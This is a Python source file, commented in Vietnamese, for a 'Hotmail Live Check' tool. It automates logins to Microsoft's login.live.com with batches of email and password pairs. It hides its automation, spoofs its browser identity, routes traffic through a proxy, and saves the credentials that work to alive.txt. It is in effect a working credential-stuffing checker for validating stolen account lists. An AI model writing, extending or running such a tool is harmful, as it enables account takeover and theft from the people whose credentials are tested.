#!/usr/bin/env python3
"""
Hotmail Live Check - Core checker engine
Dùng Playwright để kiểm tra tài khoản Hotmail sống/chết
"""
import time, json, os, re
from threading import Lock
from playwright.sync_api import sync_playwright, TimeoutError as PwTimeout

PROXY_PAC_DEFAULT = os.environ.get('PROXY_PAC', 'http://ip.mproxy.vn/12313.pac')

class HotmailChecker:
    def __init__(self, proxy_pac=None):
        self.proxy_pac = proxy_pac or PROXY_PAC_DEFAULT
        self.browser = None
        self.playwright = None
        self.results = {'alive': [], 'dead': [], 'total': 0, 'processed': 0, 'running': False}
        self.lock = Lock()
        self._stop_flag = False

    def _launch_browser(self):
        args = ['--no-sandbox', '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled']
        if self.proxy_pac:
            args.append(f'--proxy-pac-url={self.proxy_pac}')
        
        self.playwright = sync_playwright().start()
        self.browser = self.playwright.chromium.launch(
            headless=True,
            args=args
        )

    def close(self):
        self._stop_flag = True
        if self.browser:
            try: self.browser.close()
            except: pass
        if self.playwright:
            try: self.playwright.stop()
            except: pass

    def check_account(self, email, password, timeout_ms=30000):
        """Check một tài khoản, trả về (status, reason)"""
        ctx = None
        page = None
        try:
            ctx = self.browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
                locale='en-US'
            )
            page = ctx.new_page()
            
            page.goto('https://login.live.com/', timeout=timeout_ms)
            time.sleep(2)
            
            # Email
            page.wait_for_selector('input[type="email"]', timeout=10000)
            page.locator('input[type="email"]').fill(email)
            page.locator('button:has-text("Next")').click()
            time.sleep(2)
            
            # Password field
            pw_found = page.locator('input[type="password"]').count() > 0
            
            if not pw_found:
                # Check for "Use your password" link
                body = page.evaluate('document.body.innerText')
                if 'Use your password' in body:
                    page.locator('text=Use your password').click()
                    time.sleep(2)
                    pw_found = page.locator('input[type="password"]').count() > 0
                elif 'Verify your email' in body or 'verify' in body.lower():
                    # Send code to recovery email - try Use your password
                    try:
                        page.locator('text=Use your password').click()
                        time.sleep(2)
                        pw_found = page.locator('input[type="password"]').count() > 0
                    except:
                        return ('DEAD', 'verify_recovery_email')
                elif 'incorrect' in body.lower() or 'wrong' in body.lower():
                    return ('DEAD', 'wrong_email')
                else:
                    return ('DEAD', 'email_rejected')
            
            if not pw_found:
                return ('DEAD', 'no_password_field')
            
            # Fill password
            page.locator('input[type="password"]').fill(password)
            page.keyboard.press('Enter')
            time.sleep(4)
            
            # Check result
            body = page.evaluate('document.body.innerText')
            url = page.url.lower()
            
            if 'Stay signed in' in body:
                # Click Yes
                try:
                    page.locator('button:has-text("Yes")').click()
                    time.sleep(3)
                except:
                    pass
                return ('ALIVE', None)
            
            if 'outlook' in url or 'account.microsoft.com' in url:
                return ('ALIVE', None)
            
            if 'A quick note' in body:
                # Login success - post-login notification
                try:
                    page.locator('text=Continue').click()
                    time.sleep(2)
                except:
                    try:
                        page.keyboard.press('Enter')
                        time.sleep(2)
                    except:
                        pass
                return ('ALIVE', None)
            
            if 'incorrect' in body.lower() or 'wrong password' in body.lower():
                return ('DEAD', 'wrong_password')
            
            if 'verify' in body.lower() or 'approve' in body.lower() or 'code' in body.lower():
                return ('DEAD', 'needs_verification')
            
            if 'locked' in body.lower() or 'disabled' in body.lower():
                return ('DEAD', 'locked')
            
            # Default - check URL
            if 'login' not in url and 'live.com' not in url:
                return ('ALIVE', None)
            
            return ('DEAD', f'unknown:{body[:50]}')
            
        except PwTimeout:
            return ('DEAD', 'timeout')
        except Exception as e:
            return ('DEAD', f'error:{type(e).__name__}')
        finally:
            if page:
                try: page.close()
                except: pass
            if ctx:
                try: ctx.close()
                except: pass

    def check_batch(self, accounts, callback=None):
        """
        Kiểm tra batch accounts
        accounts: list of (email, password)
        callback: function(status, email, reason, progress) - gọi sau mỗi account
        """
        self._stop_flag = False
        self.results = {'alive': [], 'dead': [], 'total': len(accounts), 'processed': 0, 'running': True}
        
        try:
            self._launch_browser()
            
            for idx, (email, password) in enumerate(accounts):
                if self._stop_flag:
                    break
                
                status, reason = self.check_account(email, password)
                
                with self.lock:
                    self.results['processed'] = idx + 1
                    if status == 'ALIVE':
                        self.results['alive'].append(f'{email}|{password}')
                    else:
                        self.results['dead'].append(f'{email}|{password}|{reason}')
                
                if callback:
                    callback(status, email, reason, {
                        'processed': idx + 1,
                        'total': len(accounts),
                        'alive': len(self.results['alive']),
                        'dead': len(self.results['dead'])
                    })
            
        finally:
            self.close()
            with self.lock:
                self.results['running'] = False

    def stop(self):
        self._stop_flag = True

    def get_results(self):
        with self.lock:
            return dict(self.results)

    def save_results(self, alive_path='alive.txt', dead_path='dead.txt'):
        with self.lock:
            with open(alive_path, 'w') as f:
                f.write('\n'.join(self.results['alive']) + '\n')
            with open(dead_path, 'w') as f:
                f.write('\n'.join(self.results['dead']) + '\n')
